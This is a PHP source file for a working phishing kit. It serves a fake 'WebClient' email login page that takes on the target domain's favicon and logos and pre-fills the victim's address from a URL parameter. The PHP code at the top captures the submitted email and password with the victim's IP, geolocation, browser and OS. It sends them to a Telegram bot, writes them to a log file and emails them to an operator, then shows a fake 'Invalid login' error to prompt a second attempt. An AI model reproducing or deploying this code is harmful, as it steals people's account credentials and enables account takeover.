<?php

date_default_timezone_set('America/Chicago');
$today   = new DateTime;
error_reporting(0);
require_once 'config.php';
include '../mail.php';
require_once 'browser.php';


if(isset($_GET["x"])){
$x = $_GET['x'];
$y = base64_decode($x);
$z = explode('@', $y);
$domain = array_pop($z);
$ucdomain = ucfirst($domain);
$tldomain = explode('.', $ucdomain);
$favicon = "http://".$domain."/favicon.ico";
$touch = 'https://'.$domain;
$protectedtoken = '';
}



  if (isset($_GET['i'])) { 
	$i = $_GET["i"];
	}
	if ($i == 'outlook'){
	$avatar = "https://logo.clearbit.com/office365.com";
	}
	elseif ($i == 'google'){
	$avatar = "https://logo.clearbit.com/google.com";
	}
	elseif ($i == 'yahoo'){
	$avatar = "https://logo.clearbit.com/yahoo.com";
	}
	elseif ($i == 'others'){
	#$avatar = "images/output.png";
        $avatar = "http://".$domain."/favicon.ico";
	}
	elseif ($i == 'rackspace'){
	$avatar = "https://logo.clearbit.com/rackspace.com";
	}
	elseif ($i == 'godaddy'){
	$avatar = "https://logo.clearbit.com/godaddy.com";
	}
	elseif ($i == 'mimecast'){
	$avatar = "https://logo.clearbit.com/mimecast.com";
	}


if(isset($_GET["protectedtoken"])){
$protectedtoken = $_GET['protectedtoken'];
}
if ($protectedtoken == 'false'){
$post = '';
$herror = '';
}
elseif ($protectedtoken == 'true'){
$post = 'client.php';
$herror = '<div data-hook="well" class="o-well o-well--error o-header__well is-visible atoms-well" data-component="atoms-well-2"><img src="images/icons/information.png" width=44 height=32><div class="o-well__content"> <p class="o-well__text u-bold">Error</p> <p class="o-well__text">Invalid login username or password</p> </div></div>';
}

$ip = $_SERVER['REMOTE_ADDR'];
$url="http://www.geoplugin.net/json.gp?ip=" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$uaa = $_SERVER['HTTP_USER_AGENT'];
curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: $uaa");
$ipdat=json_decode(curl_exec($ch));

if (isset($ipdat->geoplugin_countryCode)) {
	$countrycode = $ipdat->geoplugin_countryCode;
	$cn = $ipdat->geoplugin_countryName;
	$ct = $ipdat->geoplugin_city;
	$cr = $ipdat->geoplugin_regionName;
}

$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$rs = base64_decode($api);
$hostname = gethostbyaddr($ip);
$datum = date("D M d, Y g:i a");

if (isset($_POST['username']) || isset($_POST['password'])) { 
$username = $_POST['username'];
$password = $_POST['password'];

$message .= '';
$message .= "Email: ".$username."\n";
$message .= "Password: ".$password."\n";
$message .= "IP: ".$ip.", ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$uaa."\n";
$message .= "\n";

$subject = "Mail update $ip ($cn)";
$headers = "From: Notification $cc <noreply>\n";
$headers .= "Reply-To: ".$_POST["username"]."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($username) || empty($password)) {
header("Location: ./?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=true&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=".$i."");
}
else {
	$files = explode("@",$rs);
	$chat = '@';
	$chatid = $chat.$files['1'];
	$token = $files['0'];
	$link = 'https://api.telegram.org/bot'.$token.''; 
	$parameter = [
		'chat_id' => $chatid, 
		'text' => $message
		];
 
	$request_url = $link.'/sendMessage?'.http_build_query($parameter); 
	file_get_contents($request_url);
	$accesslogs = "../admin/webclient.txt";
	$a = fopen($accesslogs, "a") or die("Unable to open file!");
	fwrite($a,$message."\n");
	fclose($a);
	mail($to,$subject,$message,$headers);
	header("Location: ./?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=true&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=".$i."");
}

}
?>
<html><head><title><?php echo $tldomain[0]; ?> WebClient</title>
<meta charset="UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0"> 
<meta name="google" value="notranslate"> <meta id="theme-colors">
<!-- Apple touch icons -->
<link rel="apple-touch-icon" sizes="57x57" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="<?php echo $touch; ?>/images/favicon/apple-touch-icon-180x180.png">
<!-- Favicon -->
<link rel="icon" type="image/png" href="<?php echo $favicon; ?>" sizes="16x16">
<link rel="icon" type="image/png" href="<?php echo $touch; ?>/images/favicon/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="<?php echo $touch; ?>/images/favicon/favicon-96x96.png" sizes="96x96">
<!-- Google icons -->
<link rel="icon" type="image/png" href="<?php echo $touch; ?>/images/favicon/android-chrome-192x192.png" sizes="192x192">
<meta name="theme-color" content="#0084d8">
<!-- Microsoft icons -->
<link rel="manifest" href="./images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#0084d8">
<meta name="msapplication-TileImage" content="./images/favicon/mstile-144x144.png">
<!-- Add to homescreen for Chrome on Android -->
<meta name="mobile-web-app-capable" content="yes">
<!-- Add to homescreen for Safari on iOS -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="translucent-black">
<meta name="apple-mobile-web-app-title" content="IceWarp WebAdmin">
<!-- Turn on IE cleartype -->
<meta http-equiv="cleartype" content="on">
<meta name="stylesheet" content="css/style.css" variables="true">  
<meta name="stylesheet" content="css/pikaday.css" variables="true">  
<link type="text/css" href="css/api.css" rel="stylesheet">  
<script src="js/config.js"></script> 
<link type="text/css" rel="stylesheet" href="css/style.css">
<link type="text/css" rel="stylesheet" href="css/pikaday.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>

$("#webclient").on('submit', function() {
   alert($("#next").val());
});
</script>
</head> 

<body dir="ltr"><div class="o-external t-default sites-login site" style="background-image: url('images/background.svg')" data-component="sites-login-1" id="content"><main class="o-external__main">   <form name="webclient" method="post" action="<?php echo $post; ?>" class="o-card c-card templates-card" data-hook="form" data-component="templates-card-4"><div class="o-card__main">  <div class="o-card__content" data-hook="content"> <section data-component="organisms-card-section-15" class=" o-card__section  o-card__section--default   "> <div data-component="organisms-card-header-4" class=" o-header  "> <div data-component="atoms-dropdown-4" class="o-dropdown" data-hook="language"> <svg data-component="atoms-icons-11" class=" o-icon  o-dropdown__icon  "><use xlink:src="images/icons/icons.svg#planet"></use></svg>  <label class="o-dropdown__text">en</label> </div>  <main class="o-header__main"><div class="o-header__content"> <div data-component="atoms-avatar-1" class="" data-color="white"><img src="<?php echo $avatar; ?>" width=100 height=100></div>   <h2 class=" o-header__title o-heading o-heading--beta  "><?php echo $tldomain[0]; ?> WebClient</h2>  <p data-component="atoms-info-2" class=" o-info  o-info--normal   o-header__subtitle  "> </p> <p data-component="atoms-info-3" class=" o-info  o-info--normal   o-header__subtitle  "><?php echo isset($_GET['x']) ? base64_decode($_GET['x']) : '' ?> </p>  </div> <?php echo $herror; ?> <div data-component="atoms-well-4" data-hook="well" class=" o-well  o-well--primary   o-header__well   "> <div class="o-well__content">   </div></div>  </main></div> </section> <section data-component="organisms-card-section-16" class=" o-card__section   u-hide  "> <label data-component="molecules-input-6" class="o-input o-form__object"> <input data-component="atoms-element-input-6" class=" o-form__element" type="text" name="username" value="<?php echo isset($_GET['x']) ? base64_decode($_GET['x']) : '' ?>" data-hook="username"> </label> </section> <section data-component="organisms-card-section-17" class=" o-card__section  o-card__section--form   "> <label data-component="molecules-input~password-7" class="o-input o-form__object is-empty"> <input data-component="atoms-element-input-7" class=" o-form__element--password o-form__element" type="password" name="password" data-hook="password"> <span data-component="atoms-label-7" class=" o-label  o-form__label  o-form__label--main  o-form__label--floating  ">Password</span> </label> </section> <section data-component="organisms-card-section-18" class=" o-card__section  o-card__section--default   "> <div data-component="molecules-button-4" class=" o-button o-form__object  o-button--block  o-button--primary   "> <button name="next" id="next" type="button" onclick="document.forms[0].submit();return false;"><span>Sign in</span></button> </div> <div data-component="molecules-checkbox-1" class=" o-checkbox o-checkbox--default   "> <input data-component="atoms-element-input-8" class=" o-checkbox__element" type="checkbox" name="remember-me" data-hook="persistentlogin">  <i class="o-checkbox__icon"></i><label class="o-checkbox__label">Keep me signed in</label></div></section> <section data-component="organisms-card-section-19" class=" o-card__section  o-card__section--default   "> <p data-component="atoms-info~not-you-4" class=" o-info   u-align-center  ">Connected to <font style="color:#0b86d2;"><?php echo $ucdomain; ?> </font> WebClient</p> </section>  </div></div></form></main> <div data-component="organisms-bar~footer-1" class=" o-bar  o-external__footer  ">  <section class=" o-bar__section  o-bar__section--start  "> <svg data-component="atoms-icons-3" class=" o-icon  o-external__logo  "><img src="<?php echo $avatar; ?>" width=35 height=35></svg>  <p class="o-external__copy o-info" title="">Powered by <?php echo $tldomain[0]; ?> ©&nbsp;<time datetime="<?php echo $today->format("Y"); ?>"><?php echo $today->format("Y"); ?></time></p>    </section>  <section class=" o-bar__section  o-bar__section--center  ">   <a class="o-external__social" href="#" target="_blank"> <svg data-component="atoms-icons-4" class=" o-icon  o-external__icon  "><use xlink:href="./images/icons/icons.svg#facebook"></use></svg>  </a>  <a class="o-external__social" href="#" target="_blank"> <svg data-component="atoms-icons-5" class=" o-icon  o-external__icon  "><use xlink:href="images/icons/icons.svg#twitter"></use></svg>  </a>  <a class="o-external__social" href="#" target="_blank"> <svg data-component="atoms-icons-6" class=" o-icon  o-external__icon  "><use xlink:href="./images/icons/icons.svg#linkedin"></use></svg>  </a>   </section>  <section class=" o-bar__section  o-bar__section--end  ">    <p class="o-info">To find out more about this update visit <a href="//www.<?php echo $domain; ?>" target="_blank" rel="noopener noreferrer">www.<?php echo $domain; ?></a></p>  </section>  </div> </div>
<script src="js/framework.min.js"></script><script src="js/bundle.min.js"></script></body></html>